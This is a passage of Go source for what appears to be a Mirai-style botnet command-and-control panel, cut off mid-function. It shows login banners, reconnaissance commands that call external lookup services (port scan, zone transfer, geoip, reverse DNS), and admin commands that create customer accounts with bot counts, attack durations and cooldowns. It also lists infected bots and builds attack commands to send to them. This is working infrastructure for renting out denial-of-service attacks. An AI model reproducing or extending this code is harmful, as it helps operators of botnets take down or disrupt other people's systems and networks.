    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m    ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m     \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m      \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;37m                             \033[0;91m                                 \033[33m      '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____             \033[0;91m                                 \033[33m       |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________]            \033[0;91m                                 \033[33m       (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)           \033[0;95m        __                       \033[33m       .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||`            \033[0;95m       |__|                      \033[33m      {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m       '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m         |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m         |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||             \033[0;91m                                 \033[33m         ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|             \033[0;91m                                 \033[33m                                              \r\n"))    
    time.Sleep(1 * time.Second)
this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m    ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m     \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m      \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;37m                  \033[0;91m                                            \033[33m      '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     ____.-.____  \033[0;91m                                            \033[33m       |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m    [___________] \033[0;91m                                            \033[33m       (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)\033[0;95m __                                         \033[33m       .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| BIN |||` \033[0;95m|__|                                        \033[33m      {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m       '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m         |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m         |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||  \033[0;91m                                            \033[33m         ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|  \033[0;91m                                            \033[33m                                              \r\n"))    
time.Sleep(1 * time.Second)
this.conn.Write([]byte("\033[2J\033[1H"))                                                                          
    this.conn.Write([]byte("\033[1;91m                          Oh No that Helios just killed your bin !                     \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                                                               \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                        \033[33m    ;-.               ,                                          \r\n"))
    this.conn.Write([]byte("\033[0;37m                                                                        \033[33m     \\ '.           .'/                                          \r\n"))
    this.conn.Write([]byte("\033[0;91m      ,.   (   .                                                        \033[33m      \\  \\ .---. .-' /                                         \r\n"))
    this.conn.Write([]byte("\033[0;91m      (     )                                                           \033[33m      '. '     `_.'                                       \r\n"))
    this.conn.Write([]byte("\033[0;91m    .; )  ' ((                                                          \033[33m       |(),()  |     ,                                       \r\n"))
    this.conn.Write([]byte("\033[0;91m     _ ., ,._'_.                                                        \033[33m       (  __   /   .' \\                                        \r\n"))
    this.conn.Write([]byte("\033[0;37m   (d|||||||||||b)                                                      \033[33m       .''.___.'--,/ _,|                                     \r\n"))
    this.conn.Write([]byte("\033[0;37m    `||| OOF |||`                                                       \033[33m      {  /     \\   }   |                                      \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m       '.\\     /_.'    /                                       \r\n"))
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m         |'-.-',  `; _.'                                  \r\n"))     
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m         |  |  |   |`                                   \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |||||||||||                                                        \033[33m         ---|  |----                                     \r\n")) 
    this.conn.Write([]byte("\033[0;37m     |_________|                                                        \033[33m                                              \r\n"))    
    time.Sleep(3 * time.Second)       
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[0;92m                  HAKKA              \r\n"))
    this.conn.Write([]byte("\033[0;91m                   >>------>\r\n"))
               continue
        } 
         if err != nil || cmd == "banner" || cmd == "BANNER" {
            this.conn.Write([]byte("\033[01;31m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[01;32m ║ \033[01;32mwoah     -> \033[01;32m  (:   \033[01;32m               ║  \r\n"))
            this.conn.Write([]byte("\033[01;36m ║ \033[01;36mkiller   -> \033[01;36m  (:    \033[01;33m              ║  \r\n"))
			this.conn.Write([]byte("\033[01;35m ║ \033[01;35mballpit  -> \033[01;35m  (:    \033[01;33m              ║  \r\n"))
			this.conn.Write([]byte("\033[01;34m ║ \033[01;34mbatkek   -> \033[01;34m  (:    \033[01;33m              ║  \r\n"))
			this.conn.Write([]byte("\033[01;31m ║ \033[01;34mgoogle   -> \033[01;31m  (:    \033[01;33m              ║  \r\n"))
			this.conn.Write([]byte("\033[01;34m ║ \033[01;32mhakka    -> \033[01;34m  (:    \033[01;33m              ║  \r\n"))
            this.conn.Write([]byte("\033[01;35m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "admin-access" {
            this.conn.Write([]byte("\033[01;31m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[01;32m ║ \033[01;33madduser-> \033[01;31mAdd Basic Client Menu \033[01;31m  ║\r\n"))
            this.conn.Write([]byte("\033[01;33m ║ \033[01;34m.admin-> \033[01;32mAdd Admin Client Menu  \033[01;32m  ║ \r\n"))
            this.conn.Write([]byte("\033[01;34m ║ \033[01;35m!remove   -> \033[01;33mRemove User Menu    \033[01;33m ║ \r\n"))
            this.conn.Write([]byte("\033[01;35m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }
        if err != nil || cmd == "RULES" || cmd == "rules" {
        botCount = clientList.Count()
		    this.conn.Write([]byte("\033[01;34m     -> | "+ username +" | <- \r\n"))
            this.conn.Write([]byte("\033[01;31m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[01;32m ║ \033[01;32mDon't spam! Don't share!          \033[01;31m║\r\n"))
            this.conn.Write([]byte("\033[01;33m ║ \033[01;33mDon't attack goverment ips.       \033[01;32m║ \r\n"))
            this.conn.Write([]byte("\033[01;34m ║ \033[01;34mVersion: \033[01;37mv4.0           \033[01;33m          ║ \r\n"))
            this.conn.Write([]byte("\033[01;35m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }
        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }


            if err != nil || cmd == "WHOIS" || cmd == "whois" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
			            continue
        }
			if err != nil || cmd == "BANNERLOOKUP" || cmd == "bannerlookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/bannerlookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
			            continue
        }
			  if err != nil || cmd == "WHOIS" || cmd == "whois" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
			            continue
        }
			if err != nil || cmd == "analytics" || cmd == "ANALYTICS" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/analyticslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[96m: \r\n\x1b[96m" + locformatted + "\r\n"))
            			            continue
        }

            if err != nil || cmd == "PING" || cmd == "ping" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[92m: \r\n\x1b[92m" + locformatted + "\r\n"))
            			            continue
        }
			   

        if err != nil || cmd == "tracer" || cmd == "TRACER" {                  
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			
			 if err != nil || cmd == "HIDDEN" || cmd == "hidden" {                  
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/pagelinks/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[92mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			

        if err != nil || cmd == "resolve" || cmd == "RESOLVE" {                  
            this.conn.Write([]byte("\x1b[96mWebsite (Without www.)\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			 if err != nil || cmd == "GEOIP" || cmd == "geoip" {                  
            this.conn.Write([]byte("\x1b[96mWebsite (Without www. / IPV4 )\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
           url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			 if err != nil || cmd == "portscan" || cmd == "PORTSCAN" {                  
            this.conn.Write([]byte("\x1b[95m IPV4 )\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
           url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
				    if err != nil || cmd == "geoip" || cmd == "" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }
		            if err != nil || cmd == "revdns" || cmd == "REVDNS" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
                        continue
            }
             
            if err != nil || cmd == "asnlookup" || cmd == "asnlookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
                            continue
            }
                 
            if err != nil || cmd == "subcalc" || cmd == "SUBCALC" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
                            continue
            }
             
            if err != nil || cmd == "ztransf" || cmd == "ZTRANSF" {
            this.conn.Write([]byte("\x1b[94mIP Address Or Website (Without www.)\x1b[0m: \x1b[94m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[93mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[92mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }
			

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "!remove" {
            this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == ".admin" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" {
            m := clientList.Distribution()
            for k, v := range m {
                t := time.Now()
                this.conn.Write([]byte(fmt.Sprintf("\033[0;35m"+t.Format("Mon Jan 2 \033[0;31m2006 \033[1;91m 15:04:05")+" \033[0;36m|\033[1;32m ↔ %s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
